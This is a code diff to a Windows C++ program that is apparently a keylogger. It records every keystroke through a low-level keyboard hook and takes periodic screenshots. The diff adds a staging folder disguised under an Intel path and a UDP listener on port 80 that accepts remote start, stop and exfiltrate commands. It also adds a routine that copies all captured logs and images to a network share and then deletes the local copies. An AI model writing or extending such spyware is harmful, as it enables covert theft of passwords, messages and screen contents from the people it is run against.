@@ -4,12 +4,23 @@
 #include <chrono>
 #include <iomanip>
 #include <gdiplus.h>
+#include <thread>
+#include <Shlobj.h>
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include <stdio.h>
+#include <time.h>
+#include <string>
+#pragma comment(lib, "ws2_32.lib")
 
 #define MAX_PATH 260
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void Save(const char* text);
 void CaptureScreenAndSave();
+void listenThread();
+void sendThread();
+void sendFileToRemote(const std::wstring& localPath, const std::wstring& remotePath);
+void deleteFile(const std::wstring& filePath);
 
 using namespace Gdiplus;
 
@@ -18,8 +29,17 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 HHOOK hHook = NULL;
 bool newLinePending = false;
 bool isNewLine = true;
+bool on = true;
+std::wstring directoryPath = L"C:\\ProgramData\\Intel\\AGS\\Temp\\Logs\\";
+std::wstring remotePath = L"\\\\192.168.100.61\\123\\";
 
 int main() {
+    if (SHCreateDirectoryEx(NULL, directoryPath.c_str(), NULL)) {
+        std::wcout << L"Already exist or something wrong " << directoryPath << std::endl;
+    }
+    else {
+        std::wcerr << L"Directory created: " << directoryPath << std::endl;
+    }
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (hHook == NULL) {
         std::cerr << "Failed to set hook\n";
@@ -31,6 +51,8 @@ int main() {
         std::cerr << "Failed to set up timer\n";
         return 1;
     }
+
+    std::thread t(listenThread);  // Create a thread
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -45,7 +67,7 @@ int main() {
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0) {
+    if (nCode >= 0 && on) {
         KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vkCode = kbdStruct->vkCode;
         bool isSpecialKey = false;
@@ -217,16 +239,33 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 void Save(const char* text) {
-    const char* remoteFilePath = "d:\\log.txt";
-    HANDLE hFile = CreateFileA(
-        remoteFilePath,
-        FILE_APPEND_DATA,
-        FILE_SHARE_READ | FILE_SHARE_WRITE,
-        NULL,
-        OPEN_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL
-    );
+    WIN32_FIND_DATA findFileData;
+    HANDLE hFind = FindFirstFile((directoryPath + L"*.txt").c_str(), &findFileData);
+    std::wstring findname = L"";
+    wchar_t filename[MAX_PATH];
+
+    if (hFind != INVALID_HANDLE_VALUE) {
+        // Found the first .txt file, return its filename
+        findname = directoryPath + findFileData.cFileName;
+        wcsncpy(filename, findname.c_str(), MAX_PATH);
+        FindClose(hFind); // Close the search handle
+    }
+    else {
+        time_t now = time(nullptr);
+        tm localTime;
+        localtime_s(&localTime, &now);
+        swprintf_s(filename, MAX_PATH, (directoryPath + L"%02d%02d%02d%02d%02d.txt").c_str(), localTime.tm_mon + 1, localTime.tm_mday, localTime.tm_hour, localTime.tm_min, localTime.tm_sec);
+    }
+
+    HANDLE hFile = CreateFileW(
+            filename,
+            FILE_APPEND_DATA,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        );
 
     if (hFile != INVALID_HANDLE_VALUE) {
         if (isNewLine) {
@@ -261,12 +300,14 @@ void Save(const char* text) {
 }
 
 void CaptureScreenAndSave() {
+    if (!on)
+        return;
     wchar_t filename[MAX_PATH];
 
     time_t now = time(nullptr);
     tm localTime;
     localtime_s(&localTime, &now);
-    swprintf_s(filename, MAX_PATH, L"\\\\192.168.100.61\\123\\%02d%02d%02d%02d%02d.jpg", localTime.tm_mon + 1, localTime.tm_mday, localTime.tm_hour, localTime.tm_min, localTime.tm_sec);
+    swprintf_s(filename, MAX_PATH, (directoryPath + L"%02d%02d%02d%02d%02d.jpg").c_str(), localTime.tm_mon + 1, localTime.tm_mday, localTime.tm_hour, localTime.tm_min, localTime.tm_sec);
 
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
@@ -352,3 +393,119 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
     free(pImageCodecInfo);
     return -1;
 }
+
+void listenThread() {
+    int error = 0;
+    const char* port = "80";
+    unsigned long ipaddr = INADDR_ANY;
+
+    //init socket
+    WSADATA wsaData;
+    WORD socketVersion = MAKEWORD(2, 2);
+    if (WSAStartup(socketVersion, &wsaData) != 0)
+    {
+        //printf("socket error occured");
+        return;
+    }
+    SOCKET msocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+
+    sockaddr_in msocktaddr;
+    msocktaddr.sin_family = AF_INET;
+    msocktaddr.sin_port = htons(atoi(port));
+    msocktaddr.sin_addr.S_un.S_addr = ipaddr;
+
+    //bind port
+    if (bind(msocket, (sockaddr*)&msocktaddr, sizeof(msocktaddr)) == SOCKET_ERROR) {
+        //printf("socket bind error !");
+        closesocket(msocket);
+        return;
+    }
+
+    //init
+    time_t now;
+    struct tm tmTmp;
+    char buffer[10];
+    sockaddr_in msocktaddr_remote;
+    int maddrlen_remote = sizeof(msocktaddr_remote);
+    int num = 0;
+    char recvdata[255];
+    int ret;
+
+    while (1)
+    {
+        ret = recvfrom(msocket, recvdata, 255, 0, (sockaddr*)&msocktaddr_remote, &maddrlen_remote);
+        if (ret > 0)
+        {
+            time(&now);
+            localtime_s(&tmTmp, &now);
+            strftime(buffer, 10, "%H:%M:%S", &tmTmp);
+
+            num++;
+            recvdata[ret] = 0x00;
+            //printf("[%03d] %s\t%s\n", num, buffer, recvdata);
+            if (strcmp(recvdata, "1") == 0) {
+                // start service
+                on = true;
+            }
+            else if (strcmp(recvdata, "2") == 0) {
+                // stop service
+                on = false;
+            }
+            else if (strcmp(recvdata, "3") == 0) {
+                // send & delete thread
+                on = false;
+                std::thread st(sendThread);  // Create a thread
+                st.join();
+                on = true;
+            }
+        }
+    }
+    closesocket(msocket);
+    WSACleanup();
+    return;
+}
+
+void sendThread() {
+    WIN32_FIND_DATA FindFileData;
+    HANDLE hFind;
+
+    // Find the first file in the directory
+    hFind = FindFirstFile((directoryPath + L"*").c_str(), &FindFileData);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        std::cerr << "FindFirstFile failed: " << GetLastError() << std::endl;
+        return;
+    }
+    do {
+        // Skip directories
+        if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            std::wstring localFilePath = directoryPath + FindFileData.cFileName;
+            std::wstring remoteFilePath = remotePath + FindFileData.cFileName;
+
+            // Send file to remote server
+            sendFileToRemote(localFilePath, remoteFilePath);
+
+            // Delete file from local directory after sending
+            deleteFile(localFilePath);
+        }
+    } while (FindNextFile(hFind, &FindFileData) != 0);
+
+    // Close handle after finished
+    FindClose(hFind);
+
+    return;
+}
+
+void sendFileToRemote(const std::wstring& localPath, const std::wstring& remotePath) {
+    // Example: Use CopyFile function to copy file to remote server directory
+    if (!CopyFile(localPath.c_str(), remotePath.c_str(), FALSE)) {
+        std::cerr << "Failed to copy file: " << GetLastError() << std::endl;
+    }
+}
+
+void deleteFile(const std::wstring& filePath) {
+    // Example: Use DeleteFile function to delete file from local directory
+    if (!DeleteFile(filePath.c_str())) {
+        std::cerr << "Failed to delete file: " << GetLastError() << std::endl;
+    }
+}
+
